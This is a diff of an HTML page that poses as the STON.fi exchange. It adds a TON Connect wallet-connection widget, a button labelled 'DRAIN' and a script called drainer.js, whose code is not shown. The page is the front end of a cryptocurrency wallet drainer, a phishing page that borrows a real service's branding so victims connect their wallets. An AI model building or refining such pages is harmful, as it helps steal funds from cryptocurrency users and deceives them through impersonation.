@@ -1,14 +1,16 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STON.fi — обменник</title>
+    <title>STON.fi</title>
+    <!-- Подключаем актуальную UI-библиотеку (версия 2.1.0) -->
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.1.0/dist/tonconnect-ui.min.js"></script>
     <style>
         body {
-            font-family: 'Segoe UI', sans-serif;
             background: #0b0e11;
             color: #fff;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,14 +18,14 @@
             margin: 0;
         }
         .container {
+            text-align: center;
             background: #1e2329;
             padding: 40px;
             border-radius: 20px;
-            text-align: center;
-            max-width: 400px;
         }
-        .logo { font-size: 28px; font-weight: 700; color: #00a3ff; }
-        .sub { color: #8b95a0; margin: 10px 0 30px; }
+        #ton-connect {
+            margin: 20px 0;
+        }
         .btn {
             background: #00a3ff;
             border: none;
@@ -31,26 +33,21 @@
             padding: 14px 40px;
             border-radius: 40px;
             font-size: 18px;
-            font-weight: 600;
             cursor: pointer;
         }
         .btn:hover { background: #0090e0; }
-        .btn:disabled { opacity: 0.5; pointer-events: none; }
-        #status { margin-top: 20px; color: #f0b90b; font-size: 14px; }
-        #debug { margin-top: 15px; font-size: 12px; color: #5e6a76; word-break: break-all; }
+        .btn:disabled { opacity: 0.5; }
+        #status { margin-top: 15px; color: #f0b90b; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">STON.fi</div>
-        <div class="sub">Децентрализованный обменник</div>
-        <button id="connectBtn" class="btn">Подключить кошелёк</button>
-        <div id="status">Готов к подключению</div>
-        <div id="debug"></div>
+        <h2>STON.fi</h2>
+        <div id="ton-connect"></div> <!-- Сюда будет встроена кнопка подключения -->
+        <button id="drainBtn" class="btn" disabled>DRAIN</button>
+        <div id="status">Подключите кошелёк</div>
     </div>
 
-    <!-- Используем актуальную сборку TON Connect SDK с jsdelivr -->
-    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@2.1.0/dist/tonconnect-sdk.min.js"></script>
     <!-- Основной скрипт -->
     <script src="drainer.js"></script>
 </body>
